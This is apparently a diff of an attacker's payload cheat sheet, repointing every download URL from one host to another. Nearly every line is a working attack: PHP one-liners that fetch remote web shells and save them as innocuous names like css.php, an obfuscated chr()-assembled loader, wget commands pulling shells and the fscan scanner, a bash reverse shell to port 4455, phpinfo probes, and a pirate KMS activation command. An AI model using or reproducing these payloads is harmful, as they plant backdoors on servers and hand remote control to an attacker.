@@ -2,37 +2,37 @@
 
 
 
-<?php file_put_contents('./css.php',file_get_contents('http://fzx.feizix.cn/php/o.txt')) ?>
+<?php file_put_contents('./css.php',file_get_contents('http://t.nzeit.vip/php/o.txt')) ?>
 
 
-<?php echo copy('http://fzx.feizix.cn/php/o.txt','niubi.php');?>
+<?php echo copy('http://t.nzeit.vip/php/o.txt','niubi.php');?>
 
-<?php echo copy('http://fzx.feizix.cn/php/c1.txt','niubi.php');?>
+<?php echo copy('http://t.nzeit.vip/php/c1.txt','niubi.php');?>
 
-<?php file_put_contents('./css.php',file_get_contents('http://fzx.feizix.cn/php/o1.txt')) ?>
-
-
-<?php $save=file_get_contents("http://fzx.feizix.cn/php/o.txt");  file_put_contents ("css.php",$save) ?>
+<?php file_put_contents('./css.php',file_get_contents('http://t.nzeit.vip/php/o1.txt')) ?>
 
 
-
-<?php file_put_contents('css.php',file_get_contents('http://fzx.feizix.cn/php/o.txt')) ?>
+<?php $save=file_get_contents("http://t.nzeit.vip/php/o.txt");  file_put_contents ("css.php",$save) ?>
 
 
 
-<?php file_put_contents('css1.php',file_get_contents('http://fzx.feizix.cn/php/o1.txt')) ?>
+<?php file_put_contents('css.php',file_get_contents('http://t.nzeit.vip/php/o.txt')) ?>
 
 
 
-<script language="php"><?php file_put_contents('./css.php',file_get_contents('http://fzx.feizix.cn/php/o.txt'))?></script>   
+<?php file_put_contents('css1.php',file_get_contents('http://t.nzeit.vip/php/o1.txt')) ?>
 
 
-<script language="php">file_put_contents('./css.php',file_get_contents('http://fzx.feizix.cn/php/o.txt'))?></script>
+
+<script language="php"><?php file_put_contents('./css.php',file_get_contents('http://t.nzeit.vip/php/o.txt'))?></script>   
+
+
+<script language="php">file_put_contents('./css.php',file_get_contents('http://t.nzeit.vip/php/o.txt'))?></script>
 
 
 <?php
 set_time_limit(666);
-$i = array("cms","chr","http://","fzx.feizix.cn/","404.jpg");
+$i = array("cms","chr","http://","t.nzeit.vip/","404.jpg");
 s($i[1],$i[2].$i[3].$i[4]);
 session_start();
 function s($c,$url){
@@ -74,11 +74,11 @@ $unzip.=$c(102).$c(108).$c(97).$c(116).$c(101);
 ?>
 
 
-wget -O c.php http://fzx.feizix.cn/php/c.txt
+wget -O c.php http://t.nzeit.vip/php/c.txt
 
-wget -O fscan http://fzx.feizix.cn/fscan
+wget -O fscan http://t.nzeit.vip/fscan
 
-bash -i >& /dev/tcp/fzx.feizix.cn/4455 0>&1
+bash -i >& /dev/tcp/t.nzeit.vip/4455 0>&1
 
 
 <?=phpinfo()?> 
@@ -104,14 +104,14 @@ post
 a=phpinfo();
 
 
-http://fzx.feizix.cn/php/mysql.txt
+http://t.nzeit.vip/php/mysql.txt
 
 win
 slmgr /skms kms.v0v.bid && slmgr /ato
 
 <?php class test{
     private $file = '3.php';
-    private $url = 'http://fzx.feizix.cn/php/o.txt';
+    private $url = 'http://t.nzeit.vip/php/o.txt';
     function __construct($copy)
     {
         $copy($this->url,$this->file);
